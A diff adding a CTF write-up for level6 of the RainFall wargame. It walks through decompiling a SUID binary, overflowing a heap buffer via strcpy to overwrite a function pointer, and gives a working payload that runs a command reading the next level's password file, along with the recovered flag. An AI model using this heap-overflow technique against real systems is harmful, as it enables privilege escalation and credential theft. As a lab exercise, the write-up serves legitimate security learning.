@@ -1,0 +1,81 @@
+When we change to level6 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
+```
+
+We find another SUID executable, this time owned by level7.
+
+```shell
+level6@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level7 users 5366 Mar  6  2016 level6
+```
+
+When executing, it just has a segmentation fault.
+
+```shell
+level6@RainFall:~$ ./level6
+Segmentation fault (core dumped)
+```
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 level6@192.168.184.128:/home/user/level6/level6 .
+          _____       _       ______    _ _
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.184.128:4242
+level6@192.168.184.128's password:
+level6                                                                                                                                100% 5366   892.7KB/s   00:00
+```
+
+The decompiled code looks like this:
+
+```C
+void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
+{
+  puts("Nope");
+  return;
+}
+
+void n(void)
+{
+  system("/bin/cat /home/user/level7/.pass");
+  return;
+}
+
+void main(undefined4 param_1,int param_2)
+{
+  char *__dest;
+  code **ppcVar1;
+  
+  __dest = (char *)malloc(0x40);
+  ppcVar1 = (code **)malloc(4);
+  *ppcVar1 = m;
+  strcpy(__dest,*(char **)(param_2 + 4));
+  (**ppcVar1)();
+  return;
+}
+```
+
+The `ppcVar1` variable is malloc right after `__dest` variable, so we know that `ppcVar1` malloc chunk is right after the `__dest` chunk. We can overflow `__dest` buffer because `strcpy` doesn't have any boundary check. With this we can overwrite `ppcVar1` to address of function `n` so it will get called.
+
+![image](https://github.com/hennneh/rainfall/assets/50553280/ea4798f0-46e1-4187-8600-4d95cccb4d2d)
+
+We also learned that the malloc chunk structure contains metadata that is 8 bytes before the actual payload address. So the total bytes we need to overflow is 64 + 8 = 72 bytes.
+
+With this we can build our payload
+```shell
+level6@RainFall:~$ ./level6 $(python -c 'print 72*"A" + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+
